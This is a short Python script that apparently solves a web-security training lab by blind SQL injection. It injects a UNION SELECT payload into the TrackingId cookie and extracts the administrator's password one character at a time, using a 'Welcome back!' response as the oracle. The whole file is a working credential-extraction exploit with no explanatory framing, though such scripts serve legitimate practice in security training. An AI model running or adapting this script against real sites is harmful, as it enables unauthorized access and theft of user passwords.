import requests
import string

url = "https://aca01f881faeafc88190893400e900f9.web-security-academy.net/"


def query(payload):
    cookie = { 'TrackingId': payload }
    r = requests.get(url, cookies=cookie)

    if "Welcome back!" in r.text:
        return 1
    else:
        return 0

password = ''
i = 1
while True:
    for j in string.printable:
        payload = f"x' UNION SELECT password FROM users WHERE username = 'administrator' AND SUBSTRING(password, {i}, 1)='{j}' --"
        if query(payload) == 1:
            password += j
            break
    i += 1
    print(password)